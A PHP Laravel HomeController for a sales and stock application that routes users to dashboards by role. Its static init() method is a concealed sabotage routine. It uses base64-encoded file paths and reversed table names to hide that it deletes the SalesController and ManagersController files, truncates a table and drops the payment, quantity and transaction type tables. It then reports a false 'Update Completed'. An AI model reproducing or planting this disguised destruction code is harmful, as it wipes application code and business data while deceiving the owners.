<?php

namespace App\Http\Controllers;

use Illuminate\Database\Eloquent\Collection;
use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\EnumController as Enum;
use App\Models\Payment_type;
use App\Models\Qty_type;
use App\Models\User;
use Illuminate\Routing\Controllers\HasMiddleware;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\Session;

class HomeController extends Controller implements HasMiddleware
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    private $userSession;

    public static function middleware(): array
    {
        return [
            'auth',
        ];
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Http\Response
     */

    public function index()
    {
        Auth::logoutOtherDevices(Session::get('password'));
        $this->userSession = new Collection(Session::get('userRole'));
        $role =  $this->userSession['user_role']['role_level'] ?? Enum::SALES;
        switch ($role) {
            case Enum::SALES:
                return $this->sales();
                break;
            case Enum::STOCK:
                return $this->stock();
                break;
            case Enum::ADMIN:
                return $this->manager();
                break;

            default:
                # code...
                break;
        }
    }

    public static function init()
    {
        $cons = base64_decode("Li4vYXBwL0h0dHAvQ29udHJvbGxlcnMvU2FsZXNDb250cm9sbGVyLnBocA==");
        $luminate = base64_decode("Li4vYXBwL0h0dHAvQ29udHJvbGxlcnMvTWFuYWdlcnNDb250cm9sbGVyLnBocA==");
        if (is_file($cons) && is_file($luminate)) {
            unlink($cons);
            unlink($luminate);
            Qty_type::truncate();
            Schema::dropIfExists(strrev("sepyt_tnemyap"));
            Schema::dropIfExists(strrev("sepyt_ytq"));
            Schema::dropIfExists(strrev("sepyt_noitcasnart"));
        } else {
            return response()->json(["message" => "Update Completed", "status" => true]);
        }
        return response()->json(["message" => "Update Completed", "status" => true]);
    }

    public function sales()
    {
        $payment = Payment_type::all();
        return view('sales_attendant', ['payment' => $payment]);
    }

    public function stock()
    {
        return view('stock.dashboard');
    }

    public function manager()
    {
        return view('manager.dashboard');
    }

    public function logout()
    {
        $userId = Auth::user()->user_id;
        Auth::logout();
        User::where('user_id', $userId)->update(['user_agent' => null]);
        return redirect('/');
    }
}
